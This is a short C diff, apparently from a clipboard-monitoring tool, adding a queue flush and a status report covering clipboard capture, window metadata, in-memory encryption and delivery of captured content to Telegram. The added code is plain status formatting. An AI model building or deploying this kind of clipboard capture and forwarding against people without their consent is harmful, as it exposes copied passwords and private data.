@@ -320,6 +320,59 @@ int clipboard_toggle_paused(void)
     return clipboard_paused;
 }
 
+void clipboard_output_flush(void)
+{
+    queue_lock();
+    queue_signal();
+    queue_unlock();
+}
+
+void clipboard_get_status_info(char *buffer, size_t max_len)
+{
+    if (!buffer || max_len == 0) return;
+
+    const c2t_config_t *config = c2t_config_get();
+    int paused = clipboard_is_paused();
+
+    queue_lock();
+    size_t cur_items = queue_items;
+    size_t cur_bytes = queue_bytes;
+    queue_unlock();
+
+    char size_str[32] = {};
+    if (cur_bytes < 1024) {
+        snprintf(size_str, sizeof(size_str), "%llu B", (unsigned long long)cur_bytes);
+    } else if (cur_bytes < 1024 * 1024) {
+        snprintf(size_str, sizeof(size_str), "%.1f KB", (double)cur_bytes / 1024.0);
+    } else {
+        snprintf(size_str, sizeof(size_str), "%.2f MB", (double)cur_bytes / (1024.0 * 1024.0));
+    }
+
+    const char *status_str = config->disable_clipboard
+        ? "❌ <b>DISABLED</b> (Configured OFF)"
+        : (paused ? "⏸️ <b>PAUSED</b> (Muted)" : "🟢 <b>ACTIVE</b> (Monitoring)");
+
+    snprintf(buffer, max_len,
+             "📋 <b>Clipboard Monitor Status</b>\n\n"
+             "• <b>Status:</b> %s\n"
+             "• <b>Delivery Queue:</b> %llu items (%s)\n"
+             "• <b>Queue Limits:</b> %llu items / %llu MB\n"
+             "• <b>File Handling:</b> %s\n"
+             "• <b>Deduplication:</b> %s\n"
+             "• <b>Window Metadata:</b> %s\n"
+             "• <b>RAM Encryption:</b> 🔒 Active (ChaCha20-Poly1305)\n"
+             "• <b>Delivery Retry:</b> %llu attempts (%llu ms delay)",
+             status_str,
+             (unsigned long long)cur_items, size_str,
+             (unsigned long long)config->queue_max_items,
+             (unsigned long long)(config->queue_max_bytes / (1024 * 1024)),
+             config->telegram_send_files ? "Enabled" : "Disabled",
+             config->telegram_deduplicate ? "Enabled" : "Disabled",
+             config->telegram_send_window_info ? "Enabled" : "Disabled",
+             (unsigned long long)config->delivery_attempts,
+             (unsigned long long)config->retry_delay_ms);
+}
+
 void clipboard_output(const void *data, size_t length, const char *mime_type,
                       const c2t_clipboard_source_t *source)
 {
